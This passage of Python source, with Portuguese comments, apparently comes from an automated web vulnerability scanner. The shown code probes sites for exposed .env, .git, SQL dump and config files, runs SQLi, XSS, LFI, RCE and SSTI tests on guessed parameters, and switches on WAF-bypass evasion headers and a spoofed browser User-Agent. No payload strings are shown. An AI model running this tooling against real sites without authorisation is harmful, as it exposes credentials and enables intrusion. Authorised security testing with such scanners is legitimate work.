            "wp-config.php.bak", "wp-config.php~",
            "backup.sql", "dump.sql", "database.sql",
            "admin/", "administrator/",
            "phpinfo.php", "info.php",
            "robots.txt",
            "sitemap.xml",
            "crossdomain.xml",
            "clientaccesspolicy.xml",
            ".htaccess", ".htpasswd",
            "composer.json", "composer.lock",
            "package.json",
        ]

        results = []
        for path in sensitive_paths:
            url = urljoin(self.base_url + "/", path)
            status, body, _, headers = await self._request(url)

            if status == 200 and body:
                if self.soft404.is_soft_404(status, body):
                    continue

                valid, evidence, confidence = EvidenceValidator.validate_sensitive(body)

                # Se o arquivo .git/config ou .env existe e retorna conteúdo
                if not valid:
                    if path.startswith(".env") and ("=" in body or "DB_" in body or "SECRET" in body or "KEY" in body):
                        valid, evidence, confidence = True, ".env file exposed with credentials", "CONFIRMED"
                    elif path.startswith(".git") and "repositoryformatversion" in body:
                        valid, evidence, confidence = True, ".git directory exposed", "CONFIRMED"
                    elif "phpinfo" in path and ("PHP Version" in body or "PHP License" in body):
                        valid, evidence, confidence = True, "PHP info page exposed", "CONFIRMED"
                    elif path.endswith(".sql") and ("INSERT INTO" in body or "CREATE TABLE" in body or "DROP TABLE" in body):
                        valid, evidence, confidence = True, f"Database dump exposed ({path})", "CONFIRMED"

                if valid and confidence in ("CONFIRMED", "HIGH"):
                    results.append(ValidationReport(
                        vulnerability_type="Sensitive File Exposure",
                        target_url=url,
                        payload_used=path,
                        status_code=status,
                        evidence_found=evidence,
                        evidence_confidence=confidence,
                        exploitation_success=True,
                        exploitation_output=f"Sensitive file accessible: {url[:100]}... ({len(body)} bytes)",
                        cvss_estimate=8.5 if ".env" in path or ".git" in path or ".sql" in path else 6.5,
                        remediation="Remove or restrict access to these files. Configure web server deny rules.",
                        raw_response_sample=body[:400],
                        vuln_name=f"{'CRITICAL ' if '.env' in path or '.sql' in path or '.git' in path else ''}{path} Exposure",
                    ))

        return results or None

    async def test_all(self, discovered_params: List[str] = None) -> List[ValidationReport]:
        """Executa TODOS os testes contra o target."""
        all_results = []

        # 1. Sensitive files (sempre testa)
        sf_results = await self.test_sensitive_files()
        if sf_results:
            all_results.extend(sf_results)

        # 2. Testes paramétricos (se tiver params na URL)
        params = discovered_params or []
        parsed = urlparse(self.base_url)
        if parsed.query:
            params.extend(k for k, _ in [p.split("=") if "=" in p else ("", "") for p in parsed.query.split("&")])
        params = list(set([p for p in params if p]))

        # Se não tem params, tenta com parâmetros comuns
        if not params:
            params = ["id", "page", "file", "cmd", "q", "s", "search", "url", "redirect",
                       "path", "dir", "document", "folder", "name", "cat", "include",
                       "load", "read", "filepath", "filename", "template", "view"]

        # Testa cada tipo de vulnerabilidade
        test_tasks = []
        for param in params:
            test_tasks.append(self.test_sqli(param))
            test_tasks.append(self.test_xss(param))
            test_tasks.append(self.test_lfi(param))
            test_tasks.append(self.test_rce(param))
            test_tasks.append(self.test_ssti(param))
            test_tasks.append(self.test_open_redirect(param))

        batch_results = await asyncio.gather(*test_tasks, return_exceptions=True)

        for r in batch_results:
            if isinstance(r, ValidationReport) and r.is_valid():
                all_results.append(r)

        return all_results


class NexusV2Engine:
    """Motor principal V2 — orquestra todo o scan e validação."""

    def __init__(self, targets: List[str], strict_validation: bool = True,
                 max_concurrency: int = 20, timeout: int = 15,
                 waf_bypass: bool = True, deep_exploit: bool = True):
        self.targets = targets
        self.strict_validation = strict_validation
        self.max_concurrency = max_concurrency
        self.timeout = timeout
        self.waf_bypass = waf_bypass
        self.deep_exploit = deep_exploit
        self.results: List[ValidationReport] = []
        self.scanned_urls: Set[str] = set()

    async def scan_all(self) -> List[ValidationReport]:
        """Executa scan completo em todos os targets."""
        connector = aiohttp.TCPConnector(limit=self.max_concurrency, force_close=False, ssl=False)
        timeout_obj = aiohttp.ClientTimeout(total=self.timeout)

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout_obj,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
            }
        ) as session:
            for target in self.targets:
                print(f"\n[V2] Scanning: {target}")
                result = await self._scan_single(session, target)
                self.results.extend(result)
                print(f"[V2] Target complete: {target} — Found {len(result)} vulnerabilities")

        return self.results

    async def _scan_single(self, session: aiohttp.ClientSession, target: str) -> List[ValidationReport]:
        """Escaneia um único target."""
        base_url = target.rstrip("/")
        parsed = urlparse(base_url)
        host = parsed.netloc

        # 1. Health check
        print(f"[V2]  ├── Health check: {base_url}")
        try:
            async with session.get(base_url, timeout=10) as r:
                if r.status not in (200, 301, 302, 401, 403):
                    print(f"[V2]  └── Status {r.status} — aborting")
                    return []
                first_body = await r.text(errors="ignore")
                first_headers = dict(r.headers)

            # 2. Profile baseline & WAF
            waf = WAFProfilerV2()
            if self.waf_bypass:
                waf_id = waf.identify(host, first_headers)
                print(f"[V2]  ├── WAF: {waf_id}")
                print(f"[V2]  ├── WAF Bypass: Active ({len(waf.get_bypass_headers(host))} evasion headers)")

            # 3. Calibrate soft-404
            soft404 = Soft404Detector()
            if self.strict_validation:
                await soft404.calibrate(session, base_url)
                print(f"[V2]  ├── Soft-404 baseline: {'active' if soft404._ready else 'failed'}")

            # 4. Discover parameters
            print(f"[V2]  ├── Parameter discovery...", end=" ", flush=True)
            discovered_params = await self._discover_params(session, base_url)
            print(f"{len(discovered_params)} params found")

            # 5. Run vulnerability tests
            print(f"[V2]  ├── Executing vulnerability probes...")
            tester = VulnerabilityTester(
                session=session,
                base_url=base_url,
                waf_profiler=waf,
                soft404=soft404,
                target_host=host,
            )

            results = await tester.test_all(discovered_params)
            return results

        except Exception as e:
            print(f"[V2]  └── Error: {e}")
            return []

    @staticmethod
    async def _discover_params(session: aiohttp.ClientSession, url: str) -> List[str]:
        """Descobre parâmetros na URL e formulários."""
        params = []

        # Da própria URL
        parsed = urlparse(url)
        if parsed.query:
            for part in parsed.query.split("&"):
                if "=" in part:
                    params.append(part.split("=")[0])

        return params